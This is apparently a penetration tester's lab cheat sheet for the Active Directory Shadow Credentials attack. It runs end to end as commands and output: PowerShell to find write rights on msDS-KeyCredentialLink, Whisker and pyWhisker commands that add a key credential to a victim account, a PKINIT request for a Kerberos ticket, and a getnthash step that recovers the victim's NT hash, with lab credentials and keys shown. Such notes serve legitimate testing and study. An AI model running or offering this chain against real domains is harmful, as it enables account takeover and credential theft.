# Shadow Credentials
```
msDS-KeyCredentialLink GUID: 5b47d60f-6051-40fb-99e0-ed3a78604e5d

Windows Hello for Business (WHfB)
```

# Search msDS-KeyCredentialLink attribute
```powershell 
Get-DomainObjectAcl | Where-Object {
     $_.ObjectAceType -eq "5b47d60f-6051-40fb-99e0-ed3a78604e5d" # msDS-KeyCredentialLink-in GUID-i
 } | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                   @{Name="TargetObject"; Expression={Convert-SidToName $_.ObjectSID}},
                   ActiveDirectoryRights -Unique


Get-DomainObjectAcl  | Where-Object { $_.ObjectAceType -eq "5b47d60f-6051-40fb-99e0-ed3a78604e5d" }
```

# Whisker
```powershell
.\Whisker.exe add /target:TargetObject /domain:lab.local /dc:dc01.lab.local
.\Whisker.exe list /target:TargetObject

.\Whisker.exe remove /target:TargetObject /deviceid:<DeviceID_from_add_command>
```

# PyWhisker
```powershell
python3 /home/sako/Tools/pywhisker.py \
  -d "warzone.oxsium.local" \
  -u "ShadowOperator1" \
  -p 'Oxsium_Lab123!' \
  --target "VictimUser" \
  --action "add" \
  --dc-ip 192.168.0.199 \
  --use-ldaps
```

# Get TGT
```powershell
python3 /home/sako/Special-Tools/Active-Directory/PKINITtools/gettgtpkinit.py \ 
  -cert-pfx nPMUcQ1y.pfx \
  -pfx-pass aVMJutPy4375LBwJ043F \
  warzone.oxsium.local/VictimUser \
  /tmp/victimuser.ccache \
  -dc-ip 192.168.0.199
```
```powershell
2026-04-26 18:13:50,613 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2026-04-26 18:13:50,630 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2026-04-26 18:13:50,649 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2026-04-26 18:13:50,649 minikerberos INFO     997edbc69f9e463467fceb6d1f35f5230da896e9b160e82434ea2945d1b1f280 ( KEY )
INFO:minikerberos:997edbc69f9e463467fceb6d1f35f5230da896e9b160e82434ea2945d1b1f280
2026-04-26 18:13:50,652 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

# Export to CCACHE
```powershell
export KRB5CCNAME=/tmp/victimuser.ccache
klist
```

# Get NT Hash
```powershell
python3 /home/sako/Special-Tools/Active-Directory/PKINITtools/getnthash.py \
  -key 997edbc69f9e463467fceb6d1f35f5230da896e9b160e82434ea2945d1b1f280 \
  warzone.oxsium.local/VictimUser -dc-ip 192.168.0.199
```


